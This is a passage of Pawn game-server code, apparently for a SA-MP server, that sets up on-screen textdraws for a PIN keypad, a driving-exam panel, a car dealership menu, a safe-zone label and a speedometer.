		TextDrawSetOutline(TD_Exam[playerid][0], 0);
		TextDrawBackgroundColor(TD_Exam[playerid][0], 255);
		TextDrawFont(TD_Exam[playerid][0], 1);
		TextDrawSetProportional(TD_Exam[playerid][0], 1);
		TextDrawSetShadow(TD_Exam[playerid][0], 1);

		TD_Exam[playerid][2] = TextDrawCreate(300.600067, 296.214477, "");
		TextDrawLetterSize(TD_Exam[playerid][2], 0.000000, 0.000000);
		TextDrawTextSize(TD_Exam[playerid][2], 150.000000, 150.000000);
		TextDrawAlignment(TD_Exam[playerid][2], 1);
		TextDrawColor(TD_Exam[playerid][2], -1);
		TextDrawSetShadow(TD_Exam[playerid][2], 0);
		TextDrawSetOutline(TD_Exam[playerid][2], 0);
		TextDrawBackgroundColor(TD_Exam[playerid][2], 0);
		TextDrawFont(TD_Exam[playerid][2], 5);
		TextDrawSetProportional(TD_Exam[playerid][2], 0);
		TextDrawSetShadow(TD_Exam[playerid][2], 0);
		TextDrawSetPreviewModel(TD_Exam[playerid][2], 411);
		TextDrawSetPreviewRot(TD_Exam[playerid][2], -10.000000, 0.000000, -25.000000, 1.000000);
		TextDrawSetPreviewVehCol(TD_Exam[playerid][2], 2, 0);

		TDPinCode[playerid][22] = TextDrawCreate(495.000000, 165.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][22], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][22], 80.000000, 135.000000);
		TextDrawAlignment(TDPinCode[playerid][22], 1);
		TextDrawColor(TDPinCode[playerid][22], -1061109505);
		TextDrawSetShadow(TDPinCode[playerid][22], 0);
		TextDrawSetOutline(TDPinCode[playerid][22], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][22], 255);
		TextDrawFont(TDPinCode[playerid][22], 4);
		TextDrawSetProportional(TDPinCode[playerid][22], 0);
		TextDrawSetShadow(TDPinCode[playerid][22], 0);

		TDPinCode[playerid][0] = TextDrawCreate(500.000000, 200.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][0], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][0], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][0], 1);
		TextDrawColor(TDPinCode[playerid][0], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][0], 0);
		TextDrawSetOutline(TDPinCode[playerid][0], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][0], 255);
		TextDrawFont(TDPinCode[playerid][0], 4);
		TextDrawSetProportional(TDPinCode[playerid][0], 0);
		TextDrawSetShadow(TDPinCode[playerid][0], 0);

		TDPinCode[playerid][2] = TextDrawCreate(525.000000, 200.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][2], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][2], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][2], 1);
		TextDrawColor(TDPinCode[playerid][2], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][2], 0);
		TextDrawSetOutline(TDPinCode[playerid][2], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][2], 255);
		TextDrawFont(TDPinCode[playerid][2], 4);
		TextDrawSetProportional(TDPinCode[playerid][2], 0);
		TextDrawSetShadow(TDPinCode[playerid][2], 0);

		TDPinCode[playerid][3] = TextDrawCreate(550.000000, 200.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][3], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][3], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][3], 1);
		TextDrawColor(TDPinCode[playerid][3], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][3], 0);
		TextDrawSetOutline(TDPinCode[playerid][3], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][3], 255);
		TextDrawFont(TDPinCode[playerid][3], 4);
		TextDrawSetProportional(TDPinCode[playerid][3], 0);
		TextDrawSetShadow(TDPinCode[playerid][3], 0);

		TDPinCode[playerid][6] = TextDrawCreate(500.000000, 225.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][6], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][6], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][6], 1);
		TextDrawColor(TDPinCode[playerid][6], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][6], 0);
		TextDrawSetOutline(TDPinCode[playerid][6], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][6], 255);
		TextDrawFont(TDPinCode[playerid][6], 4);
		TextDrawSetProportional(TDPinCode[playerid][6], 0);
		TextDrawSetShadow(TDPinCode[playerid][6], 0);

		TDPinCode[playerid][7] = TextDrawCreate(525.000000, 225.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][7], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][7], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][7], 1);
		TextDrawColor(TDPinCode[playerid][7], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][7], 0);
		TextDrawSetOutline(TDPinCode[playerid][7], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][7], 255);
		TextDrawFont(TDPinCode[playerid][7], 4);
		TextDrawSetProportional(TDPinCode[playerid][7], 0);
		TextDrawSetShadow(TDPinCode[playerid][7], 0);

		TDPinCode[playerid][8] = TextDrawCreate(550.000000, 225.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][8], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][8], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][8], 1);
		TextDrawColor(TDPinCode[playerid][8], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][8], 0);
		TextDrawSetOutline(TDPinCode[playerid][8], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][8], 255);
		TextDrawFont(TDPinCode[playerid][8], 4);
		TextDrawSetProportional(TDPinCode[playerid][8], 0);
		TextDrawSetShadow(TDPinCode[playerid][8], 0);

		TDPinCode[playerid][9] = TextDrawCreate(500.000000, 250.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][9], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][9], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][9], 1);
		TextDrawColor(TDPinCode[playerid][9], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][9], 0);
		TextDrawSetOutline(TDPinCode[playerid][9], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][9], 255);
		TextDrawFont(TDPinCode[playerid][9], 4);
		TextDrawSetProportional(TDPinCode[playerid][9], 0);
		TextDrawSetShadow(TDPinCode[playerid][9], 0);

		TDPinCode[playerid][10] = TextDrawCreate(525.000000, 250.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][10], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][10], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][10], 1);
		TextDrawColor(TDPinCode[playerid][10], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][10], 0);
		TextDrawSetOutline(TDPinCode[playerid][10], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][10], 255);
		TextDrawFont(TDPinCode[playerid][10], 4);
		TextDrawSetProportional(TDPinCode[playerid][10], 0);
		TextDrawSetShadow(TDPinCode[playerid][10], 0);

		TDPinCode[playerid][11] = TextDrawCreate(550.000000, 250.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][11], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][11], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][11], 1);
		TextDrawColor(TDPinCode[playerid][11], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][11], 0);
		TextDrawSetOutline(TDPinCode[playerid][11], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][11], 255);
		TextDrawFont(TDPinCode[playerid][11], 4);
		TextDrawSetProportional(TDPinCode[playerid][11], 0);
		TextDrawSetShadow(TDPinCode[playerid][11], 0);

		TDPinCode[playerid][18] = TextDrawCreate(500.000000, 275.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][18], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][18], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][18], 1);
		TextDrawColor(TDPinCode[playerid][18], 16711935);
		TextDrawSetSelectable(TDPinCode[playerid][18], false);
		TextDrawSetShadow(TDPinCode[playerid][18], 0);
		TextDrawSetOutline(TDPinCode[playerid][18], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][18], 255);
		TextDrawFont(TDPinCode[playerid][18], 4);
		TextDrawSetProportional(TDPinCode[playerid][18], 0);
		TextDrawSetShadow(TDPinCode[playerid][18], 0);

		TDPinCode[playerid][19] = TextDrawCreate(525.000000, 275.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][19], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][19], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][19], 1);
		TextDrawColor(TDPinCode[playerid][19], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][19], 0);
		TextDrawSetOutline(TDPinCode[playerid][19], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][19], 255);
		TextDrawFont(TDPinCode[playerid][19], 4);
		TextDrawSetProportional(TDPinCode[playerid][19], 0);
		TextDrawSetShadow(TDPinCode[playerid][19], 0);

		TDPinCode[playerid][20] = TextDrawCreate(550.000000, 275.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][20], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][20], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][20], 1);
		TextDrawColor(TDPinCode[playerid][20], -16776961);
		TextDrawSetShadow(TDPinCode[playerid][20], 0);
		TextDrawSetOutline(TDPinCode[playerid][20], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][20], 255);
		TextDrawFont(TDPinCode[playerid][20], 4);
		TextDrawSetProportional(TDPinCode[playerid][20], 0);
		TextDrawSetShadow(TDPinCode[playerid][20], 0);

		TDPinCode[playerid][21] = TextDrawCreate(500.000000, 170.000000, "LD_SPAC:white");
		TextDrawLetterSize(TDPinCode[playerid][21], 0.000000, 0.000000);
		TextDrawTextSize(TDPinCode[playerid][21], 70.000000, 25.000000);
		TextDrawAlignment(TDPinCode[playerid][21], 1);
		TextDrawColor(TDPinCode[playerid][21], -2139062017);
		TextDrawSetShadow(TDPinCode[playerid][21], 0);
		TextDrawSetOutline(TDPinCode[playerid][21], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][21], 255);
		TextDrawFont(TDPinCode[playerid][21], 4);
		TextDrawSetProportional(TDPinCode[playerid][21], 0);
		TextDrawSetShadow(TDPinCode[playerid][21], 0);

		TDPinCode[playerid][1] = TextDrawCreate(510.000000, 200.000000, "1");
		TextDrawLetterSize(TDPinCode[playerid][1], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][1], 2);
		TextDrawTextSize(TDPinCode[playerid][1], 20.000000, 20.000000);
		TextDrawColor(TDPinCode[playerid][1], -1);
		TextDrawSetShadow(TDPinCode[playerid][1], 0);
		TextDrawSetOutline(TDPinCode[playerid][1], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][1], 255);
		TextDrawFont(TDPinCode[playerid][1], 3);
		TextDrawSetProportional(TDPinCode[playerid][1], 1);
		TextDrawSetShadow(TDPinCode[playerid][1], 0);
		TextDrawSetSelectable(TDPinCode[playerid][1], true);

		TDPinCode[playerid][4] = TextDrawCreate(535.000000, 200.000000, "2");
		TextDrawLetterSize(TDPinCode[playerid][4], 0.500000, 2.000000);
		TextDrawTextSize(TDPinCode[playerid][4], 20.000000, 20.000000);
		TextDrawAlignment(TDPinCode[playerid][4], 2);
		TextDrawColor(TDPinCode[playerid][4], -1);
		TextDrawSetShadow(TDPinCode[playerid][4], 0);
		TextDrawSetOutline(TDPinCode[playerid][4], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][4], 255);
		TextDrawFont(TDPinCode[playerid][4], 3);
		TextDrawSetProportional(TDPinCode[playerid][4], 1);
		TextDrawSetShadow(TDPinCode[playerid][4], 0);
		TextDrawSetSelectable(TDPinCode[playerid][4], true);

		TDPinCode[playerid][5] = TextDrawCreate(560.000000, 200.000000, "3");
		TextDrawLetterSize(TDPinCode[playerid][5], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][5], 2);
		TextDrawColor(TDPinCode[playerid][5], -1);
		TextDrawSetShadow(TDPinCode[playerid][5], 0);
		TextDrawTextSize(TDPinCode[playerid][5], 20.000000, 20.000000);
		TextDrawSetOutline(TDPinCode[playerid][5], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][5], 255);
		TextDrawFont(TDPinCode[playerid][5], 3);
		TextDrawSetProportional(TDPinCode[playerid][5], 1);
		TextDrawSetShadow(TDPinCode[playerid][5], 0);
		TextDrawSetSelectable(TDPinCode[playerid][5], true);

		TDPinCode[playerid][12] = TextDrawCreate(510.000000, 225.000000, "4");
		TextDrawLetterSize(TDPinCode[playerid][12], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][12], 2);
		TextDrawColor(TDPinCode[playerid][12], -1);
		TextDrawSetShadow(TDPinCode[playerid][12], 0);
		TextDrawSetOutline(TDPinCode[playerid][12], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][12], 255);
		TextDrawTextSize(TDPinCode[playerid][12], 20.000000, 20.000000);
		TextDrawFont(TDPinCode[playerid][12], 3);
		TextDrawSetProportional(TDPinCode[playerid][12], 1);
		TextDrawSetShadow(TDPinCode[playerid][12], 0);
		TextDrawSetSelectable(TDPinCode[playerid][12], true);

		TDPinCode[playerid][13] = TextDrawCreate(535.000000, 225.000000, "5");
		TextDrawLetterSize(TDPinCode[playerid][13], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][13], 2);
		TextDrawColor(TDPinCode[playerid][13], -1);
		TextDrawSetShadow(TDPinCode[playerid][13], 0);
		TextDrawSetOutline(TDPinCode[playerid][13], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][13], 255);
		TextDrawFont(TDPinCode[playerid][13], 3);
		TextDrawTextSize(TDPinCode[playerid][13], 20.000000, 20.000000);
		TextDrawSetProportional(TDPinCode[playerid][13], 1);
		TextDrawSetShadow(TDPinCode[playerid][13], 0);
		TextDrawSetSelectable(TDPinCode[playerid][13], true);

		TDPinCode[playerid][14] = TextDrawCreate(560.000000, 225.000000, "6");
		TextDrawLetterSize(TDPinCode[playerid][14], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][14], 2);
		TextDrawColor(TDPinCode[playerid][14], -1);
		TextDrawSetShadow(TDPinCode[playerid][14], 0);
		TextDrawSetOutline(TDPinCode[playerid][14], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][14], 255);
		TextDrawFont(TDPinCode[playerid][14], 3);
		TextDrawTextSize(TDPinCode[playerid][14], 20.000000, 20.000000);
		TextDrawSetProportional(TDPinCode[playerid][14], 1);
		TextDrawSetShadow(TDPinCode[playerid][14], 0);
		TextDrawSetSelectable(TDPinCode[playerid][14], true);

		TDPinCode[playerid][15] = TextDrawCreate(510.000000, 250.000000, "7");
		TextDrawLetterSize(TDPinCode[playerid][15], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][15], 2);
		TextDrawColor(TDPinCode[playerid][15], -1);
		TextDrawSetShadow(TDPinCode[playerid][15], 0);
		TextDrawSetOutline(TDPinCode[playerid][15], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][15], 255);
		TextDrawFont(TDPinCode[playerid][15], 3);
		TextDrawSetProportional(TDPinCode[playerid][15], 1);
		TextDrawTextSize(TDPinCode[playerid][15], 20.000000, 20.000000);
		TextDrawSetShadow(TDPinCode[playerid][15], 0);
		TextDrawSetSelectable(TDPinCode[playerid][15], true);

		TDPinCode[playerid][16] = TextDrawCreate(535.000000, 250.000000, "8");
		TextDrawLetterSize(TDPinCode[playerid][16], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][16], 2);
		TextDrawColor(TDPinCode[playerid][16], -1);
		TextDrawSetShadow(TDPinCode[playerid][16], 0);
		TextDrawSetOutline(TDPinCode[playerid][16], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][16], 255);
		TextDrawFont(TDPinCode[playerid][16], 3);
		TextDrawSetProportional(TDPinCode[playerid][16], 1);
		TextDrawSetShadow(TDPinCode[playerid][16], 0);
		TextDrawSetSelectable(TDPinCode[playerid][16], true);
		TextDrawTextSize(TDPinCode[playerid][16], 20.000000, 20.000000);

		TDPinCode[playerid][17] = TextDrawCreate(560.000000, 250.000000, "9");
		TextDrawLetterSize(TDPinCode[playerid][17], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][17], 2);
		TextDrawColor(TDPinCode[playerid][17], -1);
		TextDrawTextSize(TDPinCode[playerid][17], 20.000000, 20.000000);
		TextDrawSetShadow(TDPinCode[playerid][17], 0);
		TextDrawSetOutline(TDPinCode[playerid][17], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][17], 255);
		TextDrawFont(TDPinCode[playerid][17], 3);
		TextDrawSetProportional(TDPinCode[playerid][17], 1);
		TextDrawSetShadow(TDPinCode[playerid][17], 0);
		TextDrawSetSelectable(TDPinCode[playerid][17], true);

		TDPinCode[playerid][25] = TextDrawCreate(560.000000, 275.000000, "C");
		TextDrawLetterSize(TDPinCode[playerid][25], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][25], 2);
		TextDrawColor(TDPinCode[playerid][25], -1);
		TextDrawTextSize(TDPinCode[playerid][25], 20.000000, 20.000000);
		TextDrawSetShadow(TDPinCode[playerid][25], 0);
		TextDrawSetOutline(TDPinCode[playerid][25], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][25], 255);
		TextDrawFont(TDPinCode[playerid][25], 3);
		TextDrawSetProportional(TDPinCode[playerid][25], 1);
		TextDrawSetShadow(TDPinCode[playerid][25], 0);
		TextDrawSetSelectable(TDPinCode[playerid][25], true);

		TDPinCode[playerid][26] = TextDrawCreate(510.000000, 275.000000, "OK");
		TextDrawLetterSize(TDPinCode[playerid][26], 0.400000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][26], 2);
		TextDrawColor(TDPinCode[playerid][26], -1);
		TextDrawTextSize(TDPinCode[playerid][26], 20.000000, 20.000000);
		TextDrawSetShadow(TDPinCode[playerid][26], 0);
		TextDrawSetOutline(TDPinCode[playerid][26], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][26], 255);
		TextDrawFont(TDPinCode[playerid][26], 3);
		TextDrawSetProportional(TDPinCode[playerid][26], 1);
		TextDrawSetShadow(TDPinCode[playerid][26], 0);
		TextDrawSetSelectable(TDPinCode[playerid][26], true);

		TDPinCode[playerid][24] = TextDrawCreate(535.000000, 275.000000, "0");
		TextDrawLetterSize(TDPinCode[playerid][24], 0.500000, 2.000000);
		TextDrawAlignment(TDPinCode[playerid][24], 2);
		TextDrawColor(TDPinCode[playerid][24], -1);
		TextDrawSetShadow(TDPinCode[playerid][24], 0);
		TextDrawSetOutline(TDPinCode[playerid][24], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][24], 255);
		TextDrawFont(TDPinCode[playerid][24], 3);
		TextDrawSetProportional(TDPinCode[playerid][24], 1);
		TextDrawSetShadow(TDPinCode[playerid][24], 0);
		TextDrawSetSelectable(TDPinCode[playerid][24], true);
		TextDrawTextSize(TDPinCode[playerid][24], 20.000000, 20.000000);

		TDPinCode[playerid][23] = TextDrawCreate(535.000000, 171.500000, "_");
		TextDrawLetterSize(TDPinCode[playerid][23], 0.550000, 2.099999);
		TextDrawAlignment(TDPinCode[playerid][23], 2);
		TextDrawColor(TDPinCode[playerid][23], -1);
		TextDrawSetShadow(TDPinCode[playerid][23], 0);
		TextDrawSetOutline(TDPinCode[playerid][23], 0);
		TextDrawBackgroundColor(TDPinCode[playerid][23], 255);
		TextDrawFont(TDPinCode[playerid][23], 3);
		TextDrawSetProportional(TDPinCode[playerid][23], 1);
		TextDrawSetShadow(TDPinCode[playerid][23], 0);



shacklog[playerid] = TextDrawCreate(231.199966, 317.333435, "Your account is loading...");
TextDrawLetterSize(shacklog[playerid], 0.449999, 1.600000);
TextDrawAlignment(shacklog[playerid], 1);
TextDrawColor(shacklog[playerid], -1);
TextDrawSetShadow(shacklog[playerid], 0);
TextDrawSetOutline(shacklog[playerid], 1);
TextDrawBackgroundColor(shacklog[playerid], 51);
TextDrawFont(shacklog[playerid], 1);
TextDrawSetProportional(shacklog[playerid], 1);


 	TD_pConnectUp[playerid] = TextDrawCreate(320.000000, 163.00000, "JoKeR GaminG");
		TextDrawLetterSize(TD_pConnectUp[playerid], 0.0000, 0.000000);//0.6000, 2.570000
		TextDrawAlignment(TD_pConnectUp[playerid], 2);
		TextDrawColor(TD_pConnectUp[playerid], -5963521);
		TextDrawSetShadow(TD_pConnectUp[playerid], 0);
		TextDrawSetOutline(TD_pConnectUp[playerid], 1);
		TextDrawBackgroundColor(TD_pConnectUp[playerid], -2147483393);
		TextDrawFont(TD_pConnectUp[playerid], 3);
		TextDrawSetProportional(TD_pConnectUp[playerid], 1);
		TextDrawSetShadow(TD_pConnectUp[playerid], 0);



SafeZone[playerid] = TextDrawCreate(259.000000, 2.488875, "Safe Zone");
TextDrawLetterSize(SafeZone[playerid], 0.555499, 2.066665);
TextDrawAlignment(SafeZone[playerid], 1);
TextDrawColor(SafeZone[playerid], 0x54cd3bFF );
TextDrawSetShadow(SafeZone[playerid], 0);
TextDrawSetOutline(SafeZone[playerid], 1);
TextDrawBackgroundColor(SafeZone[playerid], 255);
TextDrawFont(SafeZone[playerid], 2);
TextDrawSetProportional(SafeZone[playerid], 1);


	CarModel[playerid] = CreatePlayerTextDraw(playerid, 457.000000, 191.644439, "Model: Infernus");
	PlayerTextDrawLetterSize(playerid, CarModel[playerid], 0.423999, 1.824000);
	PlayerTextDrawAlignment(playerid, CarModel[playerid], 1);
	PlayerTextDrawColor(playerid, CarModel[playerid], -1);
	PlayerTextDrawSetShadow(playerid, CarModel[playerid], 0);
	PlayerTextDrawSetOutline(playerid, CarModel[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, CarModel[playerid], 51);
	PlayerTextDrawFont(playerid, CarModel[playerid], 1);
	PlayerTextDrawSetProportional(playerid, CarModel[playerid], 1);

	PriceModel[playerid] = CreatePlayerTextDraw(playerid, 459.000000, 207.822204, "Gheymat: 1.150.000");
	PlayerTextDrawLetterSize(playerid, PriceModel[playerid], 0.449999, 1.600000);
	PlayerTextDrawAlignment(playerid, PriceModel[playerid], 1);
	PlayerTextDrawColor(playerid, PriceModel[playerid], -1);
	PlayerTextDrawSetShadow(playerid, PriceModel[playerid], 0);
	PlayerTextDrawSetOutline(playerid, PriceModel[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, PriceModel[playerid], 51);
	PlayerTextDrawFont(playerid, PriceModel[playerid], 1);
	PlayerTextDrawSetProportional(playerid, PriceModel[playerid], 1);

TestModel[playerid] = TextDrawCreate(350.000000, 345.705810, "Test_Model");
TextDrawLetterSize(TestModel[playerid], 0.544499, 2.042244);
TextDrawTextSize(TestModel[playerid], 451.000000, 15.533336);
TextDrawAlignment(TestModel[playerid], 1);
TextDrawColor(TestModel[playerid], -1);
TextDrawUseBox(TestModel[playerid], true);
TextDrawBoxColor(TestModel[playerid], 0);
TextDrawSetShadow(TestModel[playerid], 0);
TextDrawSetOutline(TestModel[playerid], 1);
TextDrawFont(TestModel[playerid], 1);
TextDrawSetProportional(TestModel[playerid], 1);
TextDrawSetSelectable(TestModel[playerid], true);

BuyModel[playerid] = TextDrawCreate(244.000000, 346.211151, "Buy_Model");
TextDrawLetterSize(BuyModel[playerid], 0.573500, 1.993160);
TextDrawTextSize(BuyModel[playerid], 340.500000, 15.733333);
TextDrawAlignment(BuyModel[playerid], 1);
TextDrawColor(BuyModel[playerid], -1);
TextDrawUseBox(BuyModel[playerid], true);
TextDrawBoxColor(BuyModel[playerid],0);
TextDrawSetShadow(BuyModel[playerid], 0);
TextDrawSetOutline(BuyModel[playerid], 1);
TextDrawFont(BuyModel[playerid], 1);
TextDrawSetProportional(BuyModel[playerid], 1);
TextDrawSetSelectable(BuyModel[playerid], true);


ExitDS[playerid] = TextDrawCreate(329.500000, 371.099975, "Exit");
TextDrawLetterSize(ExitDS[playerid], 0.561500, 2.150789);
TextDrawTextSize(ExitDS[playerid], 363.000000, 10.866698);
TextDrawAlignment(ExitDS[playerid], 1);
TextDrawColor(ExitDS[playerid], -1);
TextDrawUseBox(ExitDS[playerid], true);
TextDrawBoxColor(ExitDS[playerid], 0);
TextDrawSetShadow(ExitDS[playerid], 0);
TextDrawSetOutline(ExitDS[playerid], 1);
TextDrawFont(ExitDS[playerid], 1);
TextDrawSetProportional(ExitDS[playerid], 1);
TextDrawSetSelectable(ExitDS[playerid], true);

RotModel[playerid] = TextDrawCreate(243.625000, 313.233337, "Rot._Left");
TextDrawLetterSize(RotModel[playerid], 0.298000, 2.060220);
TextDrawTextSize(RotModel[playerid], 281.000000, 15.844445);
TextDrawAlignment(RotModel[playerid], 1);
TextDrawColor(RotModel[playerid], -1);
TextDrawUseBox(RotModel[playerid], true);
TextDrawBoxColor(RotModel[playerid], 0);
TextDrawSetShadow(RotModel[playerid], 0);
TextDrawSetOutline(RotModel[playerid], 1);
TextDrawFont(RotModel[playerid], 1);
TextDrawSetProportional(RotModel[playerid], 1);
TextDrawSetSelectable(RotModel[playerid], true);

RotModel2[playerid] = TextDrawCreate(403.500000, 313.233337, "Rot._Right");
TextDrawLetterSize(RotModel2[playerid], 0.298000, 2.060220);
TextDrawTextSize(RotModel2[playerid], 454.500000, 15.355529);
TextDrawAlignment(RotModel2[playerid], 1);
TextDrawColor(RotModel2[playerid], -1);
TextDrawUseBox(RotModel2[playerid], true);
TextDrawBoxColor(RotModel2[playerid], 0);
TextDrawSetShadow(RotModel2[playerid], 0);
TextDrawSetOutline(RotModel2[playerid], 1);
TextDrawFont(RotModel2[playerid], 1);
TextDrawSetProportional(RotModel2[playerid], 1);
TextDrawSetSelectable(RotModel2[playerid], true);



NextModel[playerid] = TextDrawCreate(470.500000, 250.233337, ">");
TextDrawLetterSize(NextModel[playerid], 0.508000, 1.760220);
TextDrawTextSize(NextModel[playerid], 520.500000, 15.355529);
TextDrawAlignment(NextModel[playerid], 1);
TextDrawColor(NextModel[playerid], -1);
TextDrawUseBox(NextModel[playerid], true);
TextDrawBoxColor(NextModel[playerid], 0);
TextDrawSetShadow(NextModel[playerid], 0);
TextDrawSetOutline(NextModel[playerid], 1);
TextDrawFont(NextModel[playerid], 1);
TextDrawSetProportional(NextModel[playerid], 1);
TextDrawSetSelectable(NextModel[playerid], true);

PrevModel[playerid] = TextDrawCreate(200.500000, 250.233337, "<");
TextDrawLetterSize(PrevModel[playerid], 0.508000, 1.760220);
TextDrawTextSize(PrevModel[playerid], 250.500000, 15.355529);
TextDrawAlignment(PrevModel[playerid], 1);
TextDrawColor(PrevModel[playerid], -1);
TextDrawUseBox(PrevModel[playerid], true);
TextDrawBoxColor(PrevModel[playerid], 0);
TextDrawSetShadow(PrevModel[playerid], 0);
TextDrawSetOutline(PrevModel[playerid], 1);
TextDrawFont(PrevModel[playerid], 1);
TextDrawSetProportional(PrevModel[playerid], 1);
TextDrawSetSelectable(PrevModel[playerid], true);


CarModel[playerid] = TextDrawCreate(457.000000, 191.644439, "Model: Infernus");
TextDrawLetterSize(CarModel[playerid], 0.423999, 1.824000);
TextDrawAlignment(CarModel[playerid], 1);
TextDrawColor(CarModel[playerid], -1);
TextDrawSetShadow(CarModel[playerid], 0);
TextDrawSetOutline(CarModel[playerid], 1);
TextDrawBackgroundColor(CarModel[playerid], 51);
TextDrawFont(CarModel[playerid], 1);
TextDrawSetProportional(CarModel[playerid], 1);

PriceModel[playerid] = TextDrawCreate(459.000000, 207.822204, "Price: 1.150.000");
TextDrawLetterSize(PriceModel[playerid], 0.449999, 1.600000);
TextDrawAlignment(PriceModel[playerid], 1);
TextDrawColor(PriceModel[playerid], -1);
TextDrawSetShadow(PriceModel[playerid], 0);
TextDrawSetOutline(PriceModel[playerid], 1);
TextDrawBackgroundColor(PriceModel[playerid], 51);
TextDrawFont(PriceModel[playerid], 1);
TextDrawSetProportional(PriceModel[playerid], 1);


		TD_PlayerName[playerid] = TextDrawCreate(86.000000, 322.000000, "PlayerName(ID)");
		TextDrawLetterSize(TD_PlayerName[playerid], 0.370000, 1.700000);
		TextDrawAlignment(TD_PlayerName[playerid], 2);
		TextDrawColor(TD_PlayerName[playerid], -1061109505);
		TextDrawSetShadow(TD_PlayerName[playerid], 0);
		TextDrawSetOutline(TD_PlayerName[playerid], 1);
		TextDrawBackgroundColor(TD_PlayerName[playerid], 255);
		TextDrawFont(TD_PlayerName[playerid], 1);
		TextDrawSetProportional(TD_PlayerName[playerid], 1);
		TextDrawSetShadow(TD_PlayerName[playerid], 0);

		SpeedoTextDraw[playerid] = TextDrawCreate(520.000000, 385.000000, "Speed:_230_Km/H");
		TextDrawLetterSize(SpeedoTextDraw[playerid], 0.200000, 1.200000);
		TextDrawAlignment(SpeedoTextDraw[playerid], 1);
		TextDrawColor(SpeedoTextDraw[playerid], -1);
		TextDrawSetShadow(SpeedoTextDraw[playerid], 0);
